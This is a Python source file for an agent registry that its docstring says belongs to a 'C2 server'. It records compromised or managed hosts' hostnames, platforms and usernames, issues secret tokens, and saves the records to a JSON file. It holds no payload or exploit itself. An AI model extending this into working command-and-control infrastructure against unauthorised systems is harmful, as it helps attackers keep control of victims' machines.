import secrets
import threading
from datetime import datetime, timezone
from typing import Dict, Optional, Any
import json
import os

class AgentService:
    def __init__(self, storage_file: str = "agents.json"):
        self._storage: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()
        self._storage_file = storage_file
        self._load_from_file()

    def _load_from_file(self):
        """Load agents from JSON file if exists."""
        if os.path.exists(self._storage_file):
            try:
                with open(self._storage_file, 'r') as f:
                    self._storage = json.load(f)
            except:
                self._storage = {}

    def _save_to_file(self):
        """Save agents to JSON file."""
        try:
            with open(self._storage_file, 'w') as f:
                json.dump(self._storage, f, indent=2)
        except:
            pass

    def generate_agent_id(self) -> str:
        """Generate a unique agent ID."""
        return secrets.token_hex(8).upper()

    def generate_token(self) -> str:
        """Generate a persistent agent token."""
        return secrets.token_hex(32)

    def register_agent(
        self,
        centralized_code: str,
        hostname: str,
        platform: str,
        username: str,
        meta: Optional[Dict[str, Any]] = None,
        agent_id: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Register a new agent with the C2 server.
        """
        if not agent_id:
            agent_id = self.generate_agent_id()
        
        token = self.generate_token()
        now = datetime.now(timezone.utc).isoformat()

        agent_record = {
            "agent_id": agent_id,
            "token": token,
            "centralized_code": centralized_code,
            "hostname": hostname,
            "platform": platform,
            "username": username,
            "meta": meta or {},
            "status": "connected",
            "registered_at": now,
            "last_seen": now
        }

        with self._lock:
            self._storage[agent_id] = agent_record
            self._save_to_file()

        return {
            "status": "registered",
            "agent_id": agent_id,
            "token": token
        }

    def connect_agent(self, agent_id: str, token: str) -> Dict[str, Any]:
        """
        Reconnect an existing agent using agent_id and token.
        """
        with self._lock:
            agent = self._storage.get(agent_id)
            
            if not agent:
                return None
            
            if agent.get("token") != token:
                return None
            
            agent["status"] = "connected"
            agent["last_seen"] = datetime.now(timezone.utc).isoformat()
            
            self._save_to_file()
            
            return {
                "status": "connected",
                "agent_id": agent_id,
                "last_seen": agent["last_seen"]
            }

    def get_agent(self, agent_id: str) -> Optional[Dict[str, Any]]:
        """Retrieve agent details."""
        with self._lock:
            return self._storage.get(agent_id)

    def list_agents(self) -> Dict[str, Dict[str, Any]]:
        """List all agents."""
        with self._lock:
            return dict(self._storage)

agent_service = AgentService()
